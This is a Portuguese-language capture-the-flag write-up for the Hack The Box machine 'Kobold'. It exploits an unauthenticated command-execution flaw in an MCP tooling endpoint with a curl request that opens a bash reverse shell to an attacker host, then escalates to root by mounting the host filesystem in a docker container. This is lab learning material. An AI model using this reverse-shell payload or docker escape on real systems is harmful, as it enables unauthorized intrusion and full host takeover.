# Máquina: Kobold(Hack The Box)

## Enumeração
Comecei realizando o scan com o nmap, para descobrir portas abertas e serviços disponíveis no alvo:

<img width="711" height="151" alt="nmap" src="https://github.com/user-attachments/assets/9226c4b2-bb66-4475-b8d2-24b5fc89714d" />

Descobri que há um serviço http em execução no alvo que quando acessamos, nos leva para um https, então, comecei a enumeração web.

Na página principal, não havia nada que podiamos aproveitar, então, usei o gobuster para enumerar subdomínios ocultos.

<img width="550" height="321" alt="gobuster" src="https://github.com/user-attachments/assets/0577ae13-7b83-4b2f-81b2-9acba55b7c41" />

Descobri dois subdomínios e o que mais chamou atenção foi o "mcp.kobold". Acessando, descobri que havia um mcpjam rodando na versão 1.4.2, versão essa que é vulnerável a CVE-2026-23744.

<img width="272" height="101" alt="mcp version" src="https://github.com/user-attachments/assets/96bdb11e-2d38-4d4d-bcb7-24ecb7da3fd0" />
  
A vulnerabilidade está no endpoint "/api/mcp/connect": Ele aceita um payload JSON com o objeto "serverConfig" que especifica comandos e argumentos para executar. Como não há validação e autenticação nos comandos e argumentos, qualquer um pode passar comandos shell e conseguir um RCE.

## Exploração

Realizando o exploit:

```bash
##Abrindo um listener com o netcat
nc -lnvp 4444

##Realizando o RCE:

curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
    -H "Content-Type: application/json" \
    -d '{"serverId": "shell1", "serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/<YOURIP>/4444 0>&1"], "
```

Consegui um shell no host como usuário "ben":
<img width="454" height="49" alt="ben uid" src="https://github.com/user-attachments/assets/c627fac6-d65c-49f6-8764-b20d832bec2d" />

Extraí a user flag:
<img width="323" height="46" alt="user" src="https://github.com/user-attachments/assets/ea29e5c0-b719-4fec-ba3b-707b564b51ec" />

Estabilizei a shell utilizando python:  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Escalação de privilégios
Ao enumerar o host, descobri que o docker está em execução mas não podemos interagir porque "ben" não está no grupo docker. Consegui mudar o grupo ativo do ben com:
```bash
newgrp docker
```
O que nos da permissão para iniciar um container.
```bash
docker ps
```
<img width="1131" height="98" alt="container image" src="https://github.com/user-attachments/assets/30acb968-9546-4167-b900-6888dedb0c03" />

 Descobri que havia uma imagem já instalada no host: "privatebin/nginx-fpm-alpine:2.0.2", então a utilizei para iniciar o container docker.  

 Montei todos os arquivos do sistema host para o diretório /mnt no container e rodei ele como root:

 ```bash
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```
Já no container, defini o diretório /mnt como raíz do sistema:
```bash
chroot /mnt sh
```

Assim, consegui acesso completo aos arquivos do host como root e extraí a root flag:
<img width="285" height="113" alt="rootflag" src="https://github.com/user-attachments/assets/b4d624ee-f349-4b88-a7f2-abc6b90cce71" />

Finalizando essa máquina.

